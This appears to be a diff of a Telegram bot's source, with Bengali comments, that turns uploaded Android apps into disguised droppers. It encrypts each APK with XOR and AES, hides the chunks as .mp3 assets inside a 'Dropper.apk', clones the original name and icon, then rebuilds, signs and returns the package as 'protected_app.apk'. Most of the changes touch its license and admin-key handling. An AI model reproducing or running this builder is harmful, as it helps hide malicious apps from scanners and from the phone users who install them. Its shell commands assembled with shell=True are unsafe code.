@@ -49,6 +49,9 @@ REQUIRED_GROUP = "@hackdin_red"
 GROUP_INVITE_LINK = "https://t.me/hackdin_red"
 DAILY_LIMIT = 1
 
+# ----- অ্যাডমিন আইডি (যে ইউজার /genkey ব্যবহার করতে পারবে) -----
+ADMIN_USER_ID = 123456789  # <-- আপনার টেলিগ্রাম আইডি বসান
+
 # ----- ক্রিপ্টো (আপনার দেওয়া কী) -----
 OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
 OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="
@@ -65,7 +68,7 @@ ACTUAL_AES_KEY = decode_obfuscated(OBFUSCATED_AES_KEY_B64)
 ACTUAL_XOR_KEY = decode_obfuscated(OBFUSCATED_XOR_KEY_B64)
 IV_HEX = "aabbccddeeffaabbccddeeffaabbccdd"
 NUM_PARTS = 15
-PREFIX = "part_"   # আপনার অ্যাপের getSecret(3) অনুযায়ী (যদি খালি হয়, তাহলে "" দিন)
+PREFIX = ""   # <-- খালি রাখুন (getSecret(3) খালি স্ট্রিং দিলে)
 TARGET_PACKAGE = "com.meteah.apl"
 
 # ----- ডাটাবেস (কী + ডেইলি লিমিট) -----
@@ -99,10 +102,13 @@ def generate_key(user_id):
     conn.close()
     return key
 
-def validate_key(user_id, key):
+def validate_key(user_id, key=None):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('SELECT expiry_date FROM keys WHERE user_id=? AND key=?', (user_id, key))
+    if key:
+        c.execute('SELECT expiry_date FROM keys WHERE user_id=? AND key=?', (user_id, key))
+    else:
+        c.execute('SELECT expiry_date FROM keys WHERE user_id=?', (user_id,))
     row = c.fetchone()
     conn.close()
     if not row:
@@ -126,7 +132,7 @@ def check_daily_limit(user_id):
     conn.close()
     today = datetime.datetime.now().date().isoformat()
     if not row:
-        return True  # নতুন ইউজার
+        return False  # যদি ইউজারের কোনো এন্ট্রি না থাকে, তাহলে তাকে কী নিতে হবে
     last_date, count = row
     if last_date == today:
         return count < DAILY_LIMIT
@@ -146,22 +152,18 @@ def increment_use(user_id):
     conn.commit()
     conn.close()
 
-# ----- এনক্রিপশন (XOR → AES) – আপনার app.py-এর মতো -----
+# ----- এনক্রিপশন (XOR → AES) -----
 def process_encryption(apk_data: bytes, assets_dir: str):
-    # 1. XOR
     xor_step = xor_data(apk_data, ACTUAL_XOR_KEY)
-    # 2. AES (CBC, PKCS5)
     iv_bytes = bytes.fromhex(IV_HEX)
     cipher = AES.new(ACTUAL_AES_KEY, AES.MODE_CBC, iv_bytes)
     encrypted_full = cipher.encrypt(pad(xor_step, AES.block_size))
-    # 3. চাঙ্ক
     chunk_size = len(encrypted_full) // NUM_PARTS + 1
     chunks = []
     for i in range(NUM_PARTS):
         start = i * chunk_size
         end = min(start + chunk_size, len(encrypted_full))
         chunks.append(encrypted_full[start:end])
-    # 4. মেটাডেটা (manifest.json)
     meta = {
         "build_id": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
         "timestamp": int(time.time()),
@@ -179,7 +181,6 @@ def process_encryption(apk_data: bytes, assets_dir: str):
     os.makedirs(assets_dir, exist_ok=True)
     with open(os.path.join(assets_dir, 'manifest.json'), 'w') as f:
         json.dump(meta, f, indent=4)
-    # 5. চাঙ্ক ফাইল
     for i, chunk in enumerate(chunks):
         with open(os.path.join(assets_dir, f"{PREFIX}{i}.mp3"), 'wb') as f:
             f.write(bytes(chunk))
@@ -198,7 +199,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         with open(input_apk, 'wb') as f:
             f.write(apk_data)
 
-        # 1. ইউজারের APK ডিকম্পাইল (শুধু নাম ও আইকন বের করতে)
         decoded_user = os.path.join(work_dir, 'decoded_user')
         cmd = f"apktool d -f -o {decoded_user} {input_apk}"
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
@@ -206,7 +206,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             await context.bot.send_message(chat_id, f"❌ Decode user APK failed:\n{result.stderr[:500]}")
             return
 
-        # 2. নাম ও আইকন এক্সট্র্যাক্ট
         app_name = "App"
         strings_path = os.path.join(decoded_user, 'res/values/strings.xml')
         if os.path.exists(strings_path):
@@ -221,7 +220,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
-        # 3. Dropper.apk ডিকম্পাইল
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
             await context.bot.send_message(chat_id, "❌ Dropper.apk not found! Please place it in the bot directory.")
@@ -233,11 +231,9 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{result.stderr[:500]}")
             return
 
-        # 4. অ্যাসেট রিপ্লেস (manifest.json + .mp3)
         assets_dir = os.path.join(decoded_dropper, 'assets')
         process_encryption(apk_data, assets_dir)
 
-        # 5. নাম ও আইকন কপি (শুধু .png ফাইল)
         res_user = os.path.join(decoded_user, 'res')
         res_dropper = os.path.join(decoded_dropper, 'res')
         if os.path.exists(res_user):
@@ -250,7 +246,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                         for f in os.listdir(src):
                             if f.endswith('.png'):
                                 shutil.copy2(os.path.join(src, f), dst)
-        # strings.xml আপডেট
+
         strings_dst = os.path.join(decoded_dropper, 'res/values/strings.xml')
         if os.path.exists(strings_dst):
             try:
@@ -265,12 +261,10 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
-        # 6. Manifest আপডেট (label ও icon সেট)
         manifest_path = os.path.join(decoded_dropper, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
             with open(manifest_path, 'r') as f:
                 content = f.read()
-            # label ও icon যোগ/আপডেট
             if 'android:label="' in content:
                 content = re.sub(r'android:label=".*?"', 'android:label="@string/app_name"', content)
             else:
@@ -282,7 +276,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             with open(manifest_path, 'w') as f:
                 f.write(content)
 
-        # 7. রিকম্পাইল
         output_apk = os.path.join(work_dir, 'output.apk')
         cmd = f"apktool b -o {output_apk} {decoded_dropper}"
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
@@ -290,7 +283,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             await context.bot.send_message(chat_id, f"❌ Rebuild failed:\n{result.stderr[:500]}")
             return
 
-        # 8. সাইন
         keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
         if not os.path.exists(keystore):
             await context.bot.send_message(chat_id, "❌ Keystore not found! Please upload signer/myKey.p12")
@@ -307,7 +299,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             await context.bot.send_message(chat_id, f"❌ Signing failed:\n{result.stderr[:500]}")
             return
 
-        # 9. অ্যালাইন (ঐচ্ছিক)
         aligned_apk = os.path.join(work_dir, 'aligned.apk')
         try:
             subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True)
@@ -315,14 +306,11 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         except:
             final_apk = output_apk
 
-        # 10. ইউজারকে পাঠান
         with open(final_apk, 'rb') as f:
             await context.bot.send_document(chat_id, f, filename="protected_app.apk")
         await context.bot.send_message(chat_id, "✅ Done! Your protected APK is ready.")
 
-        # 11. ব্যবহার কাউন্ট বাড়ান
         increment_use(user_id)
-
         shutil.rmtree(work_dir)
         logger.info(f"APK processing complete for user {user_id}")
 
@@ -334,13 +322,13 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 # ----- বট কমান্ড -----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-        [InlineKeyboardButton("🔑 Get License Key", callback_data='get_key')],
+        [InlineKeyboardButton("🔑 Activate License", callback_data='get_key')],
         [InlineKeyboardButton("📤 Upload APK", callback_data='upload')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
         "🤖 APK Converter Bot\n\n"
-        "Get a 30-day license key first.\n"
+        "Click 'Activate License' to get a 30-day license (key is hidden).\n"
         f"⚠️ You must join {GROUP_INVITE_LINK} first.\n"
         f"Daily limit: {DAILY_LIMIT} APK per day.",
         reply_markup=reply_markup
@@ -352,10 +340,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
 
     if query.data == 'get_key':
-        key = generate_key(user_id)
+        # চেক করুন ইউজারের আগে থেকে কী আছে কিনা
+        existing = get_user_key(user_id)
+        if existing and validate_key(user_id):
+            await query.edit_message_text("✅ You already have an active license. You can upload your APK.")
+            return
+        # নতুন কী জেনারেট ও সেভ (কী দেখানো হবে না)
+        generate_key(user_id)
         await query.edit_message_text(
-            f"✅ Your 30-day key:\n\n`{key}`\n\n"
-            f"Send /activate {key}"
+            "✅ Your 30-day license has been activated!\n"
+            "You can now upload your APK."
         )
     elif query.data == 'upload':
         # ১. গ্রুপ চেক
@@ -368,27 +362,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception:
             await query.edit_message_text("❌ Could not verify group membership. Please join the group.")
             return
-        # ২. লাইসেন্স চেক
-        key_data = get_user_key(user_id)
-        if not key_data or not validate_key(user_id, key_data[0]):
-            await query.edit_message_text("❌ No valid license. Get a key first.")
+        # ২. লাইসেন্স চেক (কী ছাড়া)
+        if not validate_key(user_id):
+            await query.edit_message_text("❌ No valid license. Click 'Activate License' first.")
             return
         # ৩. ডেইলি লিমিট চেক
         if not check_daily_limit(user_id):
-            await query.edit_message_text(f"❌ Daily limit ({DAILY_LIMIT}) reached. Use a new key tomorrow.")
+            await query.edit_message_text(f"❌ Daily limit ({DAILY_LIMIT}) reached. Try again tomorrow.")
             return
         await query.edit_message_text("📤 Send your APK file.")
-
-async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    args = context.args
-    if not args:
-        await update.message.reply_text("Usage: /activate <key>")
-        return
-    user_id = update.effective_user.id
-    if validate_key(user_id, args[0]):
-        await update.message.reply_text("✅ Key activated!")
-    else:
-        await update.message.reply_text("❌ Invalid or expired key.")
 
 async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -405,21 +387,17 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # ২. লাইসেন্স চেক
-    key_data = get_user_key(user_id)
-    if not key_data or not validate_key(user_id, key_data[0]):
-        await update.message.reply_text("❌ No valid license. Get a key first.")
+    if not validate_key(user_id):
+        await update.message.reply_text("❌ No valid license. Click 'Activate License' first.")
         return
 
     # ৩. ডেইলি লিমিট চেক
     if not check_daily_limit(user_id):
-        await update.message.reply_text(f"❌ Daily limit ({DAILY_LIMIT}) reached. Use a new key tomorrow.")
+        await update.message.reply_text(f"❌ Daily limit ({DAILY_LIMIT}) reached. Try again tomorrow.")
         return
 
-    if not update.message.document:
-        await update.message.reply_text("❌ Please send an APK file.")
-        return
-    if not update.message.document.file_name.endswith('.apk'):
-        await update.message.reply_text("❌ File must be .apk")
+    if not update.message.document or not update.message.document.file_name.endswith('.apk'):
+        await update.message.reply_text("❌ Please send a valid APK file.")
         return
 
     await update.message.reply_text("📦 APK received! Starting processing...")
@@ -431,11 +409,27 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to download: {str(e)}")
 
+# ----- অ্যাডমিন কমান্ড (ইউজারের জন্য কী জেনারেট) -----
+async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ You are not authorized to use this command.")
+        return
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /genkey <user_id>")
+        return
+    try:
+        target_id = int(args[0])
+        key = generate_key(target_id)
+        await update.message.reply_text(f"✅ Key generated for user {target_id}: `{key}` (stored in DB)")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "Commands:\n"
         "/start - Main menu\n"
-        "/activate <key> - Activate license\n"
+        "/genkey <user_id> - (Admin) Generate key for a user\n"
         "/help - This help"
     )
 
@@ -455,7 +449,7 @@ def run_bot():
         application = Application.builder().token(BOT_TOKEN).build()
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
-        application.add_handler(CommandHandler("activate", activate))
+        application.add_handler(CommandHandler("genkey", genkey_command))  # অ্যাডমিন কমান্ড
         application.add_handler(CallbackQueryHandler(button_handler))
         application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
 
